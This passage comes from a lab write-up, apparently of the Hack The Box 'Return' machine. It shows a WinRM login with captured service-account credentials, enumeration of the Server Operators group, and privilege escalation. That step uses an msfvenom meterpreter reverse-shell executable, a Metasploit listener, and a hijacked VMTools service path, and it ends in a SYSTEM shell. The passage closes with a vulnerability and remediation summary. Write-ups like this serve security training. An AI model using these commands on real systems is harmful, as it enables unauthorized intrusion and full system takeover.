+[LDAP] Cleartext Password : [HIDDEN]</code></pre><p id="e4db4f43-72d9-4b13-86e2-04f9e2f1c6d7" class="">We successfully captured the clear-text password for the <mark class="highlight-red"><code><strong>svc-printer</strong></code></mark> user. Since <mark class="highlight-default">port </mark><mark class="highlight-red"><code><strong>5985</strong></code></mark> is open (it is the <a href="https://en.wikipedia.org/wiki/Windows_Remote_Management">WinRM</a> service), we can try to connect to it with those credentials using <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a> : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1ce42296-6343-444c-ac9a-405eb097c72a" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.129.95.241 -u svc-printer -p &#x27;[HIDDEN]&#x27;
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                   
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt;</code></pre><p id="99a46b80-1e79-4cc7-8634-7bf38e8e27b6" class="">We successfully gained an initial access on the target system via the <a href="https://en.wikipedia.org/wiki/Windows_Remote_Management">WinRM</a> service. Why do user account <strong><code><mark class="highlight-red">svc-printer</mark></code></strong> has access to the <a href="https://en.wikipedia.org/wiki/Windows_Remote_Management">WinRM</a> service ? This may be considered as a vulnerability since it gives more privileges to this account than it needs.</p><h1 id="f164ab6b-2742-417c-8f1f-686c4ea27199" class="">Local enumeration</h1><p id="f143baac-b989-459a-8a0f-be67048da424" class="">Let’s see what privileges does <code><strong>svc-printer</strong></code> have : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="828daf88-a182-40ed-954d-e4467897d85b" class="code"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; whoami /all
+                                                                                                                              
+USER INFORMATION                                                                                                              
+----------------                                                                                                              
+                                                                                                                              
+User Name          SID                                                                                                        
+================== =============================================                                                              
+return\svc-printer S-1-5-21-3750359090-2939318659-876128439-1103                                                              
+                                                                                                                              
+                                                                                                                              
+GROUP INFORMATION                                                                                                             
+-----------------                                                                                                             
+                                                                                                                              
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                         State
+============================= =================================== =======
+SeMachineAccountPrivilege     Add workstations to domain          Enabled
+SeLoadDriverPrivilege         Load and unload device drivers      Enabled
+SeSystemtimePrivilege         Change the system time              Enabled
+SeBackupPrivilege             Back up files and directories       Enabled
+SeRestorePrivilege            Restore files and directories       Enabled
+SeShutdownPrivilege           Shut down the system                Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
+SeTimeZonePrivilege           Change the time zone                Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.</code></pre><p id="a9e25eb1-f7fa-4656-893f-8158a4599d5f" class="">You can notice that <mark class="highlight-red"><code><strong>svc-printer</strong></code></mark> user is a member of the <strong>Server Operators</strong> group. According to the <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators">Security Groups Microsoft documentation</a> : </p><blockquote id="624ad568-4953-4c0b-8262-fa9a6f1e85a2" class="">Members of the <strong>Server Operators</strong> group can <mark class="highlight-red"><strong>administer domain controllers</strong></mark>. This group exists only on domain controllers. By default, the group has no members. Members of the <strong>Server Operators</strong> group can take the following actions: sign in to a server interactively, create and delete network shared resources, <mark class="highlight-red"><strong>start and stop services</strong></mark>, back up and restore files, format the hard disk drive of the computer, and shut down the computer. This group can&#x27;t be renamed, deleted, or removed.</blockquote><p id="f16623eb-5d4f-490f-bd3e-1ce727cbacc2" class="">Since we are able to start and stop services, we can try to change the binary path of a service to make it execute a malicious executable. Let’s see what services are running on the system : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0daf7c65-3f3a-4cb3-b2d8-56cfb1dcd615" class="code"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; services
+
+Path                                                                                                                 Privileges Service          
+----                                                                                                                 ---------- -------          
+C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
+\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
+C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
+&quot;C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe&quot;                                                False Sense            
+C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
+&quot;C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe&quot;                                                     True VGAuthService    
+&quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot;                                                                        True VMTools          
+&quot;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe&quot;                                             True WdNisSvc         
+&quot;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe&quot;                                            True WinDefend        
+&quot;C:\Program Files\Windows Media Player\wmpnetwk.exe&quot;                                                                      False WMPNetworkSvc</code></pre><p id="37985cff-1e83-492e-99bd-dabc0e7e665c" class="">We can use <mark class="highlight-red"><code><strong>sc.exe</strong></code></mark> to list the permissions on services. We can try with the <strong>VMTools</strong> service : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3efcb9eb-96fe-4cbe-bbfc-32a683672d9d" class="code"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; sc.exe sdshow VMTools
+
+D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)</code></pre><p id="92fd7ae5-87d5-4fef-ae8d-03f47f83464d" class="">The output is in <strong>SDDL (Security Descriptor Definition Language)</strong> format. <a href="https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/">Here</a> is a documentation to understand the syntax of this output. According to this documentation, the <mark class="highlight-default"><strong>Server Operators</strong></mark> group has the following privileges on the <mark class="highlight-default"><strong>VMTools</strong></mark> service : </p><ul id="5aabda85-038b-4a32-aef8-6ac5a36b9a73" class="bulleted-list"><li style="list-style-type:disc">CC : Create All Child Objects</li></ul><ul id="7106ffc4-f765-426c-a331-de1c44459974" class="bulleted-list"><li style="list-style-type:disc">DC : Delete All Child Objects</li></ul><ul id="ad114e89-f5e7-4715-a0fb-4743deb68113" class="bulleted-list"><li style="list-style-type:disc">LC : List Contents</li></ul><ul id="d0fca987-742b-4dec-87ee-a4d636e74125" class="bulleted-list"><li style="list-style-type:disc">SW : All Validated Writes</li></ul><ul id="fabfc5b8-d238-475e-a7e7-66a1892d1aa7" class="bulleted-list"><li style="list-style-type:disc">RP : Read All Properties</li></ul><ul id="7c9eaed3-1ef8-4928-b112-30cb954d3a5e" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-red"><strong>WP : Write All Properties</strong></mark></li></ul><ul id="37bc9748-d11b-44a1-b3af-0e345823ba2d" class="bulleted-list"><li style="list-style-type:disc">DT : Delete Subtree</li></ul><ul id="acd53a85-a37b-4628-8cd6-2bdb96864a67" class="bulleted-list"><li style="list-style-type:disc">LO : List Object</li></ul><ul id="ea6ad304-ede9-4a1a-b8b4-c39553b68710" class="bulleted-list"><li style="list-style-type:disc">CR : All Extended Rights</li></ul><ul id="10ecfb0d-9150-4de7-8fe8-30e3f25264ac" class="bulleted-list"><li style="list-style-type:disc">SD : Delete</li></ul><ul id="1c404ffa-9765-40b6-a8f6-dd74d691a73c" class="bulleted-list"><li style="list-style-type:disc">RC : Read Permissions</li></ul><ul id="18355b45-cf00-4742-ad6d-d2ce83760a78" class="bulleted-list"><li style="list-style-type:disc">WD : Modify Permissions</li></ul><ul id="cadb550a-c3bd-4ace-ba40-b23f50a8dfab" class="bulleted-list"><li style="list-style-type:disc">WO : Modify Owner</li></ul><p id="ea4ef576-a72b-43e2-a361-dace0b817052" class="">So we can change any properties of the <mark class="highlight-default"><strong>VMTools</strong></mark><strong> </strong>service. We know that this service runs the <mark class="highlight-default"><strong>vmtoolsd</strong></mark><strong> </strong>process. We can see if this process is running as <code><mark class="highlight-red"><strong>NT AUTHORITY\SYSTEM</strong></mark></code>. To do this, we can use the following command :</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7628bd68-0e97-452e-83b9-61aa6b61a91e" class="code"><code class="language-PowerShell">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; sc.exe qc VMTools
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: VMTools
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : &quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot;
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : VMware Tools
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem</code></pre><p id="2526f46a-b0ca-4a5b-88e0-b69572be5a0c" class=""><mark class="highlight-default"><strong>VMTools</strong></mark><strong> </strong>service runs as <code><mark class="highlight-red"><strong>LocalSystem</strong></mark></code><mark class="highlight-default">. According to </mark><a href="https://learn.microsoft.com/fr-fr/windows/win32/services/localsystem-account?redirectedfrom=MSDN"><mark class="highlight-default">this</mark></a><mark class="highlight-default"> documentation : </mark></p><blockquote id="42afe646-028a-4099-917a-160b1e9712a8" class="">The <strong>LocalSystem</strong> account is a predefined local account used by the service control manager. This account is not recognized by the security subsystem, so you cannot specify its name in a call to the <a href="https://learn.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-lookupaccountnamea"><strong>LookupAccountName</strong></a> function. It has extensive privileges on the local computer, and acts as the computer on the network. Its token includes the <mark class="highlight-red"><strong>NT AUTHORITY\SYSTEM and BUILTIN\Administrators SIDs</strong></mark></blockquote><p id="eb6b1d8c-7c01-4ffb-8f3d-090df100625e" class="">If we get a shell as this user, we may gain administrative privileges on the target system. We have everything we need to escalate our privileges.</p><h1 id="564aadd8-84fb-4148-9d2b-e5f88f053771" class="">Privilege escalation</h1><p id="ef2d5f0d-e82d-484f-8505-12f0a5076ec7" class="">First, let’s use <code><mark class="highlight-red"><strong>msfvenom</strong></mark></code><strong> </strong>to generate a malicious executable that will open a meterpreter to our attacking host : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e37c2162-d03f-4c39-9257-b407fae92fe0" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4242 -f exe-service -o rshell.exe 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe-service file: 48640 bytes
+Saved as: rshell.exe</code></pre><p id="cc21d823-b174-475f-9f7c-b9769cd5ad89" class="">Now, we can run <code><mark class="highlight-red"><strong>msfconsole</strong></mark></code><strong> </strong>and start a listener in order to receive the connexion from the meterpreter : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="060ce268-0c6a-4d2f-96d2-c1432c92c154" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(kali㉿kali)-[~]
+└─$ msfconsole                                                                                        
+                                                  
+                          ########                  #
+                      #################            #
+                   ######################         #
+                  #########################      #
+                ############################
+               ##############################
+               ###############################
+              ###############################
+              ##############################
+                              #    ########   #
+                 ##        ###        ####   ##
+                                      ###   ###
+                                    ####   ###
+               ####          ##########   ####
+               #######################   ####
+                 ####################   ####
+                  ##################  ####
+                    ############      ##
+                       ########        ###
+                      #########        #####
+                    ############      ######
+                   ########      #########
+                     #####       ########
+                       ###       #########
+                      ######    ############
+                     #######################
+                     #   #   ###  #   #   ##
+                     ########################
+                      ##     ##   ##     ##
+                            https://metasploit.com
+
+
+       =[ metasploit v6.3.4-dev                           ]
++ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
++ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Start commands with a space to avoid saving 
+them to history
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 &gt; use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set LHOST tun0
+LHOST =&gt; tun0
+msf6 exploit(multi/handler) &gt; set LPORT 4242
+LPORT =&gt; 4242
+msf6 exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 10.10.16.8:4242</code></pre><p id="285e96a0-b48e-4089-b271-61f0cf190530" class="">Then, we can upload the malicious executable to the target host : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="769cddfa-68e7-4a8b-9c45-f5443a4a6700" class="code"><code class="language-PowerShell">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; upload /home/kali/rshell.exe
+Info: Uploading /home/kali/rshell.exe to C:\Users\svc-printer\Documents\rshell.exe
+
+                                                             
+Data: 64852 bytes of 64852 bytes copied
+
+Info: Upload successful!</code></pre><p id="6a2281b8-f36a-4382-a808-382357193794" class="">Next, we can change the binary path of the <mark class="highlight-default"><strong>VMTools</strong></mark> service to the path of the malicious executable, stop the service, and start it again : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8d4e18aa-3dab-4c33-b84f-a7057a046f08" class="code"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; sc.exe config VMTools binPath=&quot;C:\Users\svc-printer\Documents\rshell.exe&quot;
+[SC] ChangeServiceConfig SUCCESS
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; sc.exe stop VMTools
+
+SERVICE_NAME: VMTools
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 1  STOPPED
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; sc.exe start VMTools
+
+SERVICE_NAME: VMTools
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+        PID                : 2256
+        FLAGS              :</code></pre><p id="5eaa9193-3474-49ca-ae20-d6f1048ff06f" class="">Finally, let’s check our listener to see if we received a connection : </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6913b455-1888-4660-b819-32ef99555720" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">[*] Started reverse TCP handler on 10.10.16.8:4242 
+[*] Sending stage (200774 bytes) to 10.129.95.241
+[*] Meterpreter session 1 opened (10.10.16.8:4242 -&gt; 10.129.95.241:52155) at 2023-05-18 19:21:52 -0400
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt;</code></pre><p id="bcf67ef5-00d7-407e-84cb-2e77ddba3969" class="">We successfully received a connection and we have a meterpreter shell as <code><mark class="highlight-red"><strong>NT AUTHORITY\SYSTEM</strong></mark></code>, so we have full control on the target system.</p><h1 id="6307cfe0-c372-4057-830b-48f1d23f9b15" class="">Vulnerabilities summary</h1><h2 id="5f90033d-ca7f-4cf3-ba85-5cbc226e83bb" class=""><mark class="highlight-blue">Missing access control</mark></h2><table id="a89a0fc5-580f-476a-a078-7f2422f235b5" class="simple-table"><thead class="simple-table-header"><tr id="9db8c2bb-6f05-47c7-be02-9c2433c8ebbb"><th id="&lt;?AB" class="simple-table-header-color simple-table-header" style="width:653px">Field</th><th id="BY@B" class="simple-table-header-color simple-table-header" style="width:653px">Value</th></tr></thead><tbody><tr id="9299b7f8-52dc-40b0-913c-1e1bcc60c6d9"><td id="&lt;?AB" class="" style="width:653px">Affected component</td><td id="BY@B" class="" style="width:653px">Printer admin panel</td></tr><tr id="5070d746-b763-4e86-93ff-d421956d46f8"><td id="&lt;?AB" class="" style="width:653px">CVSS 3.0 score</td><td id="BY@B" class="" style="width:653px"><strong>7.3</strong></td></tr><tr id="afffecab-b8cf-4591-93ee-f4d364a6b3dd"><td id="&lt;?AB" class="" style="width:653px">Severity</td><td id="BY@B" class="" style="width:653px"><mark class="highlight-red_background"><strong>HIGH</strong></mark></td></tr><tr id="c53c77a7-ca03-40bd-a506-d725937c5bf2"><td id="&lt;?AB" class="" style="width:653px">Attack vector</td><td id="BY@B" class="" style="width:653px"><strong>Network</strong></td></tr><tr id="9d183c3d-c26d-4530-8ef8-d4eab0f2a894"><td id="&lt;?AB" class="" style="width:653px">Impact</td><td id="BY@B" class="" style="width:653px">Allows an attacker to access the printer admin panel without authentication and change the printer configuration. <br/><br/>This has a <br/><mark class="highlight-orange"><strong>low</strong></mark> impact on the <mark class="highlight-blue"><strong>confidentiality</strong></mark><mark class="highlight-default"><strong>, </strong></mark><mark class="highlight-blue"><strong>integrity</strong></mark><mark class="highlight-default"><strong>, </strong></mark><mark class="highlight-blue"><strong>and availability</strong></mark><mark class="highlight-blue"> </mark>of the affected component.</td></tr><tr id="aa9f03fb-1fe0-4b7b-bd7b-0d2900dc67b3"><td id="&lt;?AB" class="" style="width:653px">Remediation proposition</td><td id="BY@B" class="" style="width:653px">You should set up access control on the printer admin panel to avoid unauthorized users to change the printer settings.</td></tr></tbody></table><h2 id="56eafe90-5b75-4435-9221-f175ec575499" class=""><mark class="highlight-blue">Insecure authentication protocol</mark></h2><table id="dc51f350-7030-402f-9115-12f836a95af4" class="simple-table"><thead class="simple-table-header"><tr id="5a93bd88-64c6-46ad-a6eb-6d454bb2d4be"><th id="&lt;?AB" class="simple-table-header-color simple-table-header" style="width:653px">Field</th><th id="BY@B" class="simple-table-header-color simple-table-header" style="width:653px">Value</th></tr></thead><tbody><tr id="99cde3d2-805e-4c24-8ce8-9a43585f0e69"><td id="&lt;?AB" class="" style="width:653px">Affected component</td><td id="BY@B" class="" style="width:653px">Printer admin panel</td></tr><tr id="0cf22f3b-b566-488e-b033-c60a9faa03a6"><td id="&lt;?AB" class="" style="width:653px">CVSS 3.0 score</td><td id="BY@B" class="" style="width:653px"><strong>7.5</strong></td></tr><tr id="4d7387c3-9c3a-4357-8e49-2c4867f68ff5"><td id="&lt;?AB" class="" style="width:653px">Severity</td><td id="BY@B" class="" style="width:653px"><mark class="highlight-red_background"><strong>HIGH</strong></mark></td></tr><tr id="f5adbf5a-4408-4b13-9140-f10ea88a7f2c"><td id="&lt;?AB" class="" style="width:653px">Attack vector</td><td id="BY@B" class="" style="width:653px"><strong>Network</strong></td></tr><tr id="dc4edc4e-ccd7-425f-a45b-f2cff5c3152e"><td id="&lt;?AB" class="" style="width:653px">Impact</td><td id="BY@B" class="" style="width:653px">Allows an attacker to access the printer admin panel without authentication and change the printer configuration. <br/><br/>This has a <br/><strong><mark class="highlight-red">high</mark></strong> impact on the <mark class="highlight-blue"><strong>confidentiality</strong></mark><mark class="highlight-blue"> </mark>of the affected component.</td></tr><tr id="a505fab0-cdb1-4a6c-b641-db50939bb138"><td id="&lt;?AB" class="" style="width:653px">Remediation proposition</td><td id="BY@B" class="" style="width:653px">You should use LDAPS authentication instead of LDAP to avoid malicious users to capture clear-text credentials when connecting to a print server.</td></tr></tbody></table><h2 id="d43ce1d4-2d63-4910-8cbc-1af8772615b1" class="block-color-blue">Local user account misconfiguration (svc-printer)</h2><table id="b80a87f5-6a5d-40d9-ada2-ce484ddb20b3" class="simple-table"><thead class="simple-table-header"><tr id="a6b2839f-31c2-47c2-8392-8ea626ff551a"><th id="&lt;?AB" class="simple-table-header-color simple-table-header" style="width:653px">Field</th><th id="BY@B" class="simple-table-header-color simple-table-header" style="width:653px">Value</th></tr></thead><tbody><tr id="16e9b1ff-9ec4-4b48-a69d-2ec7bba80a11"><td id="&lt;?AB" class="" style="width:653px">Affected component</td><td id="BY@B" class="" style="width:653px">Local system</td></tr><tr id="ea2f7db4-b012-4f91-8b65-f4c287eb8f0c"><td id="&lt;?AB" class="" style="width:653px">CVSS 3.0 score</td><td id="BY@B" class="" style="width:653px"><strong>9.8</strong></td></tr><tr id="bec9b2b0-dc08-4e99-b853-994a867b308f"><td id="&lt;?AB" class="" style="width:653px">Severity</td><td id="BY@B" class="" style="width:653px"><mark class="highlight-red_background"><strong>CRITICAL</strong></mark></td></tr><tr id="eb4b7b70-ca94-4571-aa5c-20f7093876ae"><td id="&lt;?AB" class="" style="width:653px">Attack vector</td><td id="BY@B" class="" style="width:653px"><strong>Network</strong></td></tr><tr id="3d38aaf7-6c2a-4507-a670-da7ca55c6f0e"><td id="&lt;?AB" class="" style="width:653px">Impact</td><td id="BY@B" class="" style="width:653px">Allows an attacker to gain a foothold on the system via the <a href="https://en.wikipedia.org/wiki/Windows_Remote_Management">WinRM</a> service since <code><strong>svc-printer</strong></code> is member of the <strong>Remote Management Users</strong> group. <br/><br/>Also, it allows an attacker to escalate his privileges to the <br/><code><strong>NT AUTHORITY\SYSTEM</strong></code> local account since <code><strong>svc-printer</strong></code> is member of the <strong>Service Operators</strong> 